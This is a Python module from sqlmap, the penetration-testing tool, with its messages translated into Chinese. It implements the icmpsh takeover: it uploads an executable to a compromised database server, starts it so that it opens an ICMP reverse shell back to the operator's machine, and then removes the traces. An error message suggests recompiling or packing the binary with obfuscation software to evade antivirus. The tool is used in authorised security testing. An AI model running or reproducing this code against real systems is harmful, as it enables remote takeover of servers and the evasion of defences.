#!/usr/bin/env python

"""
Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import os
import re
import socket
import time

from extra.icmpsh.icmpsh_m import main as icmpshmaster
from lib.core.common import getLocalIP
from lib.core.common import getRemoteIP
from lib.core.common import normalizePath
from lib.core.common import ntToPosixSlashes
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.data import conf
from lib.core.data import logger
from lib.core.data import paths
from lib.core.exception import SqlmapDataException

class ICMPsh(object):
    """
    This class defines methods to call icmpsh for plugins.
    """

    def _initVars(self):
        self.lhostStr = None
        self.rhostStr = None
        self.localIP = getLocalIP()
        self.remoteIP = getRemoteIP() or conf.hostname
        self._icmpslave = normalizePath(os.path.join(paths.SQLMAP_EXTRAS_PATH, "icmpsh", "icmpsh.exe_"))

    def _selectRhost(self):
        address = None
        message = "后端DBMS地址是什么? "

        if self.remoteIP:
            message += "[输入 '%s' (默认值)] " % self.remoteIP

        while not address:
            address = readInput(message, default=self.remoteIP)

            if conf.batch and not address:
                raise SqlmapDataException("缺少远程主机地址")

        return address

    def _selectLhost(self):
        address = None
        message = "本地地址是什么? "

        if self.localIP:
            message += "[输入'%s' (默认值)] " % self.localIP

        valid = None
        while not valid:
            valid = True
            address = readInput(message, default=self.localIP or "")

            try:
                socket.inet_aton(address)
            except socket.error:
                valid = False
            finally:
                valid = valid and re.search(r"\d+\.\d+\.\d+\.\d+", address) is not None

            if conf.batch and not address:
                raise SqlmapDataException("local host address is missing")
            elif address and not valid:
                warnMsg = "无效的本地主机地址"
                logger.warning(warnMsg)

        return address

    def _prepareIngredients(self, encode=True):
        self.localIP = getattr(self, "localIP", None)
        self.remoteIP = getattr(self, "remoteIP", None)
        self.lhostStr = ICMPsh._selectLhost(self)
        self.rhostStr = ICMPsh._selectRhost(self)

    def _runIcmpshMaster(self):
        infoMsg = "在本地运行icmpsh主机"
        logger.info(infoMsg)

        icmpshmaster(self.lhostStr, self.rhostStr)

    def _runIcmpshSlaveRemote(self):
        infoMsg = "远程运行icmpsh slave"
        logger.info(infoMsg)

        cmd = "%s -t %s -d 500 -b 30 -s 128 &" % (self._icmpslaveRemote, self.lhostStr)

        self.execCmd(cmd, silent=True)

    def uploadIcmpshSlave(self, web=False):
        ICMPsh._initVars(self)
        self._randStr = randomStr(lowercase=True)
        self._icmpslaveRemoteBase = "tmpi%s.exe" % self._randStr

        self._icmpslaveRemote = "%s/%s" % (conf.tmpPath, self._icmpslaveRemoteBase)
        self._icmpslaveRemote = ntToPosixSlashes(normalizePath(self._icmpslaveRemote))

        logger.info("将icmpsh slave上载到 '%s'" % self._icmpslaveRemote)

        if web:
            written = self.webUpload(self._icmpslaveRemote, os.path.split(self._icmpslaveRemote)[0], filepath=self._icmpslave)
        else:
            written = self.writeFile(self._icmpslave, self._icmpslaveRemote, "binary", forceCheck=True)

        if written is not True:
            errMsg = "上传icmpsh时出现问题 "
            errMsg += "看起来二进制文件尚未写入"
            errMsg += "数据库底层文件系统，或者AV已 "
            errMsg += "将其标记为恶意文件并将其删除。在这种情况下 "
            errMsg += "，建议重新编译icmpsh， "
            errMsg += "并对源代码进行轻微修改，或者使用 "
            errMsg += "混淆软件将其打包"
            logger.error(errMsg)

            return False
        else:
            logger.info("icmpsh已成功上载")
            return True

    def icmpPwn(self):
        ICMPsh._prepareIngredients(self)
        self._runIcmpshSlaveRemote()
        self._runIcmpshMaster()

        debugMsg = "icmpsh主机已退出"
        logger.debug(debugMsg)

        time.sleep(1)
        self.execCmd("taskkill /F /IM %s" % self._icmpslaveRemoteBase, silent=True)
        time.sleep(1)
        self.delRemoteFile(self._icmpslaveRemote)
